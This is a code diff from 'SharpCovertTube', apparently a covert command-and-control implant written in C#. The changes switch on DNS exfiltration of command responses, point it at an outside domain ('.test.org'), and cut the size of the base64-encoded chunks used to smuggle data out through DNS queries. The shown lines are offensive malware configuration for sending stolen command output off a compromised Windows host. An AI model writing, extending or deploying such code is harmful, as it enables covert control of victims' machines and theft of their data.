@@ -33,9 +33,9 @@ namespace SharpCovertTube
         // Log file 
         public const string log_file = "c:\\temp\\.sharpcoverttube.log";
         // Exfiltrate command responses through DNS or not
-        public const bool dns_exfiltration = false;
+        public const bool dns_exfiltration = true;
         // DNS hostname used for DNS exfiltration
-        public const string dns_hostname = ".test.com";
+        public const string dns_hostname = ".test.org";
 
         [DllImport("wininet.dll")] private extern static bool InternetGetConnectedState(out int Description, int ReservedValue);
         [DllImport("kernel32.dll", SetLastError = true)] private static extern IntPtr CreateFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, uint hTemplateFile);
@@ -262,7 +262,7 @@ namespace SharpCovertTube
             }
             string base64_response_cmd = Base64Encode(response_cmd);
             LogShow("Base64-encoded response:\t\t"+ base64_response_cmd);
-            int max_size = 255 - dns_hostname.Length - 2; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
+            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
             if (base64_response_cmd.Length > max_size) {
                 LogShow("Splitting encoded response in chunks of "+ max_size + " characters");
             }
